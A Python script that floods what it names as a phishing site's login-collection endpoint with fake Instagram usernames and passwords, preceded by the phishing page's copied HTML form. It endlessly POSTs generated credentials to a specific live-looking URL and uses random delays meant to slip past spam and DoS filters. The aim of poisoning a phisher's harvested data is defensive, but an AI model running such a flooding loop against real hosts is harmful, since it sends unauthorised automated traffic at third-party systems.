# Example phishing page with login form
#
# https://ded4950.inmotionhosting.com/~ohsoulreflective/?logs=Ly9pbnN0YWdyYW0vP2k9JmFtcDtpPUk0Rkox&vWHly
#
#<form method="post" action="https://shraidar.org/new_login.php" name="login_form">
#	<input type="hidden" name="user_id_victim" value="I4FJ1">
#	<input name="type" value="instagrama" type="hidden">
#	<input name="charset_test" value="?,?,?,?,?,?,?" type="hidden">
#	<input name="" value="64316" type="hidden">
#	<input name="lsd" value="cG8FP" autocomplete="off" type="hidden">
#	<div id="loginform" style="">
#		<input id="return_session" name="return_session" value="0" autocomplete="off" type="hidden">
#		<input id="legacy_return" name="legacy_return" value="1" autocomplete="off" type="hidden">
#		<input id="display" name="display" value="" autocomplete="off" type="hidden">
#		<input id="session_key_only" name="session_key_only" value="0" autocomplete="off" type="hidden">
#		<input id="trynum" name="trynum" value="1" autocomplete="off" type="hidden">
#		<input name="charset_test" value="?,?,?,?,?,?,?" type="hidden">
#		<input id="lsd" name="lsd" value="cG8FP" autocomplete="off" type="hidden">
#		<div class="form_row clearfix ">
#			<label for="email" id="label_email" class="login_form_label">Username:</label>
#			<input class="inputtext" id="email" name="email" onkeypress="formchange()" type="text">
#		</div>
#		<div class="form_row clearfix ">
#			<label for="pass" id="label_pass" class="login_form_label">Password:</label>
#			<input class="inputpassword" id="pass" name="pass" value="" type="password">
#		</div>
#		<label class="persistent">
#			<input name="hash" value="cf2f04f37826373132be7ddff89f038d,1440323991" type="hidden">
#			<input name="login" id="login" src="index_fichiers/838095336.jpg" alt="Submit Form" height="31" border="0" type="image" width="100">
#		</label>
#	</div>
#</form>

import random
import string
from time import sleep
import requests

# open files
with open('secondwords.txt', 'r') as infile:
    secondwords = infile.read().strip(' \n').split('\n')
with open('firstwords.txt', 'r') as infile:
    firstwords = infile.read().strip(' \n').split('\n')
with open('passwords.txt', 'r') as infile:
    lines = infile.read().strip(' \n').split('\n')

# bad url to send form to
badurl = "https://shraidar.org/new_login.php"

# counter for submitted data
counter = 0

# main loop
while (True):
    # choose random names and words
    word1 = random.choice(firstwords)
    word2 = random.choice(secondwords)

    # username structures often seen on instagram
    username1 = '{}{}{}'.format(word1, word2, random.randint(1, 99)) # e.g. Mariekitty99
    username2 = '{}{}{}'.format(word1[0:3], word2[0:4], random.randint(12, 22)) # e.g. Markitt22
    username3 = '{}.{}{}'.format(word1[0:3], word2[0:4], random.randint(12, 22)) # e.g. Mar.kitt22
    username4 = '{}_{}_{}'.format(word1[0:3], word2[0:4], random.randint(12, 22)) # e.g. Mar_kitt_22
    username5 = 'x{}_{}x{}'.format(word1[0:3], word2[0:4], random.randint(12, 22)) # e.g. xMar_kittx22
    username6 = 'x{}.{}x'.format(word1[0:3], word2[0:4]) # e.g. xMar.kittx
    username7 = '{}{}'.format(word1, word2[0:4]) # e.g. Mariekitt
    username8 = '{}.{}'.format(word1[0], word2[0:4]) # e.g. M.kitt
    username9 = '{}.{}.{}.{}'.format(word1[0], word2[0], word1[1], word2[1]) # e.g. M.k.a.i
    username10 = 'x{}x'.format(word2[0:6]) # e.g. xMariex
    username11 = '{}'.format(word1) # e.g. Marie
    username12 = 'real{}'.format(word1) # e.g. realMarie
    username13 = '{}memes'.format(word1) # e.g. Mariememes
    username14 = '{}.priv'.format(word1) # e.g. Marie.priv
    username15 = '{}_{}'.format(word1, word2) # e.g. Marie_kitty
    username16 = 'thats{}'.format(word1) # e.g. thatsMarie
    username17 = '{}_{}{}'.format(word1, word2[0:2], random.randint(1, 22)) # e.g. Marie_ki22
    # list with different possible username structures
    structs = [username1, username2, username3, username4, username5, username6, username7, username8, username9, username10, username11, username12, username13, username14, username15, username16, username17]
    # choose random structure
    username = random.choice(structs)
	
    # choose password from file
    password = random.choice(lines)
    while len(password) < 6: # check that password is >=6 chars
        password = random.choice(lines)

    # payload that will be send as encoded html form data (correct string can be captured with i.e. Burpsuit)
    payload = 'user_id_victim=I4FJ1&type=instagrama&charset_test=%3F%2C%3F%2C%3F%2C%3F%2C%E6%B0%B4%2C%D0%94%2C%D0%84&lsd=cG8FP&return_session=0&legacy_return=1&display=&session_key_only=0&trynum=1&charset_test=%3F%2C%3F%2C%3F%2C%3F%2C%E6%B0%B4%2C%D0%94%2C%D0%84&lsd=cG8FP&email={}&pass={}&hash=cf2f04f37826373132be7ddff89f038d%2C1440323991&login.x={}&login.y={}'.format(username, password, random.randint(20, 100), random.randint(10, 30))
    data = payload.encode("ascii") # maybe not necessary

    # send payload to badurl
    headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    response = requests.post(badurl, allow_redirects=True, data=data, headers=headers)
    if response.status_code == 200: # check if it was successful
        counter += 1
        # print the result. <Response [200]> means successfully submitted
        print(counter, "-->", response.url, "-->", response.status_code, response.reason, "-->", username, password)
    else:
        # print the error
        print(counter, "-->", response.url, "-->", response.status_code, response.reason, "--> FAILED!")

    # debug output
    #print(data)

    # sleep random time to bypass potential spam and DoS filters
    sleep(random.randint(1,10))
